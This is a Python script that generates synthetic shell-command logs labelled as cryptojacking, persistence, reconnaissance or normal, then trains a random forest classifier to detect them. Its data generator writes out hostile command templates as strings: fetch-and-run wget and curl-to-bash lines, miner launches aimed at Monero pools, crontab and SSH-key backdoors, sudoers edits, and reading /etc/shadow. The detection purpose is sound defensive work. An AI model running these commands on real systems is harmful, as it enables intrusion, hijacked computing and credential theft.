import pandas as pd
import random
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
import joblib
import os

# =====================================================================
# 1. SYNTHETIC DATA GENERATOR (6,000 Unique Rows)
# =====================================================================
def create_massive_dataset(samples_per_class=1500):
    print(f"⏳ Synthesizing {samples_per_class * 4} rows of advanced training data...")
    
    # Random variables to create massive variety in the dataset
    ips = ["192.168.1.50", "185.12.33.1", "10.0.0.5", "45.33.32.156", "github.com", "bitbucket.org", "142.250.190.46"]
    pools = ["pool.supportxmr.com:3333", "monerohash.com:3333", "minexmr.com:443", "nanopool.org:14433", "xmrpool.eu:9000"]
    miners = ["xmrig", "coinminer", "minerd", "cpuminer", "xmr-stak", "kdevtmpfsi"]
    files = ["update.sh", "install.sh", "syslogd", "cron.sh", "miner.tar.gz"]
    
    crypto, persist, recon, normal = [], [], [], []

    for _ in range(samples_per_class):
        ip = random.choice(ips)
        pool = random.choice(pools)
        miner = random.choice(miners)
        file = random.choice(files)
        
        # 1. CRYPTOJACKING (Mix and match parameters)
        crypto_cmds = [
            f"wget http://{ip}/{miner} -O /tmp/{miner} && chmod +x /tmp/{miner} && /tmp/{miner} -o {pool}",
            f"curl -s http://{ip}/{file} | bash",
            f"git clone https://{ip}/repo.git && cd repo && make",
            f"nohup ./{miner} -o {pool} -u FAKE_WALLET -p x &",
            f"cat /proc/cpuinfo; pkill -f {miner}; wget https://{ip}/{file} -O {file} && tar -xzf {file} && echo '@reboot ./{miner} -o {pool}' >> /etc/crontab"
        ]
        crypto.append(random.choice(crypto_cmds))

        # 2. PERSISTENCE
        persist_cmds = [
            f"echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys",
            "crontab -e",
            f"echo '* * * * * root /tmp/{file}' >> /etc/crontab",
            "useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd",
            "chmod u+s /bin/bash",
            "echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers"
        ]
        persist.append(random.choice(persist_cmds))

        # 3. RECONNAISSANCE
        recon_cmds = [
            "lscpu | grep 'Model name\\|Core(s) per socket\\|Thread(s) per core'",
            "cat /etc/shadow",
            "cat /etc/passwd",
            "uname -a && id && w",
            "netstat -tulpn",
            "find / -perm -4000 -type f 2>/dev/null",
            "ip a && route -n",
            "ps aux | grep root"
        ]
        recon.append(random.choice(recon_cmds))

        # 4. NORMAL / ROUTINE NOISE
        normal_cmds = [
            "ls -la /var/log",
            "cd /home/user && pwd",
            "clear",
            "sudo apt-get update && sudo apt-get upgrade",
            f"ping -c 4 {ip}",
            "history",
            "whoami",
            "echo 'checking system logs'",
            "cat /var/log/syslog | grep error",
            "top -n 1",
            "htop"
        ]
        normal.append(random.choice(normal_cmds))

    # Compile the dataset
    data = {
        "command": crypto + persist + recon + normal,
        "label": ["Cryptojacking"]*samples_per_class + ["Persistence"]*samples_per_class + ["Reconnaissance"]*samples_per_class + ["Normal"]*samples_per_class
    }
    
    df = pd.DataFrame(data)
    # Shuffle the dataset so the AI doesn't learn in order
    df = df.sample(frac=1).reset_index(drop=True)
    df.to_csv("hacker_training_data.csv", index=False)
    print(f"✅ Created 'hacker_training_data.csv' with {len(df)} randomized rows.\n")

# Auto-generate if missing
if not os.path.exists("hacker_training_data.csv"):
    create_massive_dataset()

# =====================================================================
# 2. LOAD DATA & EXTRACT MATHEMATICAL FEATURES
# =====================================================================
print("📊 Loading dataset into Pandas...")
df = pd.read_csv("hacker_training_data.csv", on_bad_lines='skip', engine='python')

# Force clean regeneration if dataset is corrupted
if 'command' not in df.columns or 'label' not in df.columns or len(df) < 1000:
    print("\n🚨 DATASET TOO SMALL OR CORRUPTED!")
    os.remove("hacker_training_data.csv")
    create_massive_dataset()
    df = pd.read_csv("hacker_training_data.csv")

X_train, X_test, y_train, y_test = train_test_split(df['command'], df['label'], test_size=0.2, random_state=42)

# N-GRAMS UPGRADE: Reads up to 3 words at a time for deep context
print("🧮 Vectorizing text data (Extracting N-Grams and TF-IDF weights)...")
vectorizer = TfidfVectorizer(ngram_range=(1, 3), max_features=8000)
X_train_math = vectorizer.fit_transform(X_train)
X_test_math = vectorizer.transform(X_test)

# =====================================================================
# 3. TRAIN THE RANDOM FOREST AI
# =====================================================================
print("🧠 Training the Random Forest Classifier on 6,000 logs...")
rf_model = RandomForestClassifier(n_estimators=150, random_state=42, n_jobs=-1)
rf_model.fit(X_train_math, y_train)

# =====================================================================
# 4. TEST THE AI AND REPORT ACCURACY
# =====================================================================
print("\n🧪 Testing AI on unseen data...")
predictions = rf_model.predict(X_test_math)
accuracy = accuracy_score(y_test, predictions)

print(f"\n======================================")
print(f"🎯 MASSIVE AI MODEL ACCURACY: {accuracy * 100:.2f}%")
print(f"======================================\n")
print("Detailed Classification Report:")
print(classification_report(y_test, predictions, zero_division=0))

# =====================================================================
# 5. SAVE THE BRAIN FOR THE DASHBOARD
# =====================================================================
print("💾 Saving AI Brain to disk...")
joblib.dump(vectorizer, "text_translator.pkl")
joblib.dump(rf_model, "random_forest_model.pkl")
print("✅ SUCCESS: The upgraded AI is ready for local_server.py!")